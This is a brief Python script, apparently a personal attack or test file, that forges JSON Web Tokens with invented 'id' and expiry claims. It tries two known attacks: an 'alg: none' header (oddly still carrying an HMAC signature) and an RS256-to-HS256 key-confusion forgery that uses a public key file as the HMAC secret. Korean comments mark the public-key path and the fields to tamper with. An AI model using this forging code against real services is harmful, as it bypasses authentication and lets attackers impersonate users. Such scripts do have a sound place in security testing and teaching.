#This file is test file for jwt token attacks. it seems okay?


import base64
import json
import hashlib
import hmac
import time

key = "111"
headDict = {"alg": "none", "typ": "JWT"}
payloadDict = {"id":"LOL", "exp": time.time() + 60, "iat": time.time()}
newContents = base64.urlsafe_b64encode(json.dumps(headDict, separators=(",",":")).encode()).decode('UTF-8').strip("=") + "." + base64.urlsafe_b64encode(json.dumps(payloadDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")

newSig=base64.urlsafe_b64encode(hmac.new(key.encode(), newContents.encode(), hashlib.sha256).digest()).decode('UTF-8').strip("=")

print(newContents + "." + newSig)


#공개키 경로 
key = open("Some Path").read()

#아래 headDict, paylDict 변조
headDict = {"alg": "HS256","typ": "JWT"}
paylDict = {"id":"LOL", "exp": time.time() + 60, "iat": time.time()}

newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
newContents = newContents.encode().decode('UTF-8')

newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")

print(newContents+"."+newSig)